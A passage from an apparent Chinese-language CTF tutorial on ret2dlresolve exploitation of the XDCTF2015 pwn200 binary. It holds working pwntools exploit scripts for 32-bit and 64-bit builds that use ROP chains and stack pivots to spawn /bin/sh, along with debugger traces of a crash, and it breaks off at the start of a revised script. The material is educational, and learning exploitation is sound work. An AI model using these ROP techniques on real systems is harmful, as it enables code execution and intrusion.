<span class=w>    </span><span class=m>00000050</span><span class=w>  </span><span class=m>32</span><span class=w> </span><span class=m>42</span><span class=w> </span>6f<span class=w> </span>4c<span class=w>  </span><span class=m>43</span><span class=w> </span><span class=m>53</span><span class=w> </span><span class=m>49</span><span class=w> </span><span class=m>33</span><span class=w>  </span><span class=m>75</span><span class=w> </span><span class=m>47</span><span class=w> </span><span class=m>59</span><span class=w> </span><span class=m>53</span><span class=w>  </span>7a<span class=w> </span><span class=m>76</span><span class=w> </span><span class=m>63</span><span class=w> </span>6b<span class=w>  </span>│2BoL│CSI3│uGYS│zvck│
<span class=w>    </span><span class=m>00000060</span><span class=w>  </span><span class=m>44</span><span class=w> </span><span class=m>43</span><span class=w> </span>4d<span class=w> </span><span class=m>41</span><span class=w>                                         </span>│DCMA│
<span class=w>    </span><span class=m>00000064</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
$<span class=w> </span>ls
<span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Sent<span class=w> </span>0x3<span class=w> </span>bytes:
<span class=w>    </span><span class=s1>&#39;ls\n&#39;</span>
<span class=o>[</span>DEBUG<span class=o>]</span><span class=w> </span>Received<span class=w> </span>0x9f<span class=w> </span>bytes:
<span class=w>    </span><span class=s1>&#39;exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n&#39;</span>
<span class=w>    </span><span class=s1>&#39;ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n&#39;</span>
<span class=w>    </span><span class=s1>&#39;main_partial_relro_32  stage1.py     stage4.py\n&#39;</span>
exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
</code></pre></div> <h5 id=pwntools>pwntools<a class=headerlink href=#pwntools title="Permanent link">&para;</a></h5> <p>這裏我們使用 pwntools 的工具進行攻擊。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_32&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
<span class=n>dlresolve</span> <span class=o>=</span> <span class=n>Ret2dlresolvePayload</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>symbol</span><span class=o>=</span><span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;/bin/sh&quot;</span><span class=p>])</span>
<span class=c1># pwntools will help us choose a proper addr</span>
<span class=c1># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>dlresolve</span><span class=o>.</span><span class=n>data_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>ret2dlresolve</span><span class=p>(</span><span class=n>dlresolve</span><span class=p>)</span>
<span class=n>raw_rop</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_32&quot;</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span><span class=mi>112</span><span class=p>:</span><span class=n>raw_rop</span><span class=p>,</span><span class=mi>256</span><span class=p>:</span><span class=n>dlresolve</span><span class=o>.</span><span class=n>payload</span><span class=p>})</span>
<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>結果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>exp-pwntools.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>24688</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
$<span class=w> </span>ls
exp-pwntools.py<span class=w>        </span>roptool.py<span class=w>    </span>stage2.py<span class=w>    </span>stage5.py
ld-linux.so.2<span class=w>           </span>roputils.pyc<span class=w>  </span>stage3.py<span class=w>    </span>stage6.py
main_partial_relro_32<span class=w>  </span>stage1.py<span class=w>     </span>stage4.py
</code></pre></div> <h3 id=full-relro>Full RELRO<a class=headerlink href=#full-relro title="Permanent link">&para;</a></h3> <p>在開啓 FULL RELRO 保護的情況下，程序中導入的函數地址會在程序開始執行之前被解析完畢，因此 got 表中 link_map 以及 dl_runtime_resolve 函數地址在程序執行的過程中不會被用到。故而，GOT 表中的這兩個地址均爲 0。此時，直接使用上面的技巧是不行的。</p> <p>那有沒有什麼辦法可以繞過這樣的防護呢？請讀者自己思考。</p> <h2 id=64>64 位例子<a class=headerlink href=#64 title="Permanent link">&para;</a></h2> <h3 id=no-relro_1>NO RELRO<a class=headerlink href=#no-relro_1 title="Permanent link">&para;</a></h3> <p>在這種情況下，類似於 32 位的情況直接構造即可。由於可以溢出的緩衝區太少，所以我們可以考慮進行棧遷移後，然後進行漏洞利用。</p> <ol> <li>在 bss 段僞造棧。棧中的數據爲<ol> <li>修改 .dynamic 節中字符串表的地址爲僞造的地址</li> <li>在僞造的地址處構造好字符串表，將 read 字符串替換爲 system 字符串。</li> <li>在特定的位置讀取 /bin/sh 字符串。</li> <li>調用 read 函數的 plt 的第二條指令，觸發 <code>_dl_runtime_resolve</code> 進行函數解析，從而觸發執行 system 函數。</li> </ol> </li> <li>棧遷移到 bss 段。</li> </ol> <p>由於程序中沒有直接設置 rdx 的 gadget，所以我們這裏就選擇了萬能 gadget。這會使得我們的 ROP 鏈變得更長</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x200</span> <span class=c1># new stack size is 0x200</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>直接運行，發現不行，經過調試發現程序在 0x7f2512db3e69 處崩了。</p> <div class=highlight><pre><span></span><code> RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R13  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R14  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 R15  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RBP  0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 &lt;_dl_fixup+18&gt;    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 &lt;_dl_fixup+22&gt;    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d &lt;_dl_fixup+29&gt;    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 &lt;_dl_fixup+33&gt;    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 &lt;_dl_fixup+37&gt;    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 &lt;_dl_fixup+41&gt;    mov    rcx, qword ptr [r8 + 8] &lt;0x7f2512ac3191&gt;
</code></pre></div> <p>經過逐步調試發現，在 <code>_dl_runtime_resolve</code> 會在棧中保存大量的數據</p> <div class=highlight><pre><span></span><code>.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
</code></pre></div> <p>其中 qword_227808 處的值爲0x0000000000000380。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg&gt; x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 &lt;_rtld_global_ro+168&gt;:   0x0000000000000380
</code></pre></div> <p>當執行完下面的指令後</p> <div class=highlight><pre><span></span><code> ► 0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;
</code></pre></div> <p>棧地址到了 0x600a00（我們是將棧遷移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 節中，後續在棧中保存數據時會破壞 .dynamic 節中的內容，最後導致了 dl_fixup 崩潰。</p> <div class=highlight><pre><span></span><code>   0x7f2512dbb7a0 &lt;_dl_runtime_resolve_xsavec&gt;       push   rbx
   0x7f2512dbb7a1 &lt;_dl_runtime_resolve_xsavec+1&gt;     mov    rbx, rsp
   0x7f2512dbb7a4 &lt;_dl_runtime_resolve_xsavec+4&gt;     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;
 ► 0x7f2512dbb7af &lt;_dl_runtime_resolve_xsavec+15&gt;    mov    qword ptr [rsp], rax &lt;0x600a00&gt;
   0x7f2512dbb7b3 &lt;_dl_runtime_resolve_xsavec+19&gt;    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 &lt;_dl_runtime_resolve_xsavec+24&gt;    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd &lt;_dl_runtime_resolve_xsavec+29&gt;    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 &lt;_dl_runtime_resolve_xsavec+34&gt;    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 &lt;_dl_runtime_resolve_xsavec+39&gt;    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* &#39;`&#39; */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* &#39;\t&#39; */
</code></pre></div> <p>或許我們可以考慮把棧再遷移的高一些，但是，程序中與 bss 相關的映射只有 0x600000-0x601000，即一頁。與此同時</p> <ul> <li>bss 段的起始地址爲 0x600B30</li> <li>僞造的棧的數據一共有 392 （0x188）</li> </ul> <p>所以直接棧遷移到 bss節很容易出現問題。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
</code></pre></div> <p>但經過精細的調節，我們還是避免破壞 .dynamic 節的內容</p> <ul> <li>修改遷移後的棧的地址爲 bss_addr+0x200，即 0x600d30</li> <li>修改遷移後的棧的大小爲 0x188</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
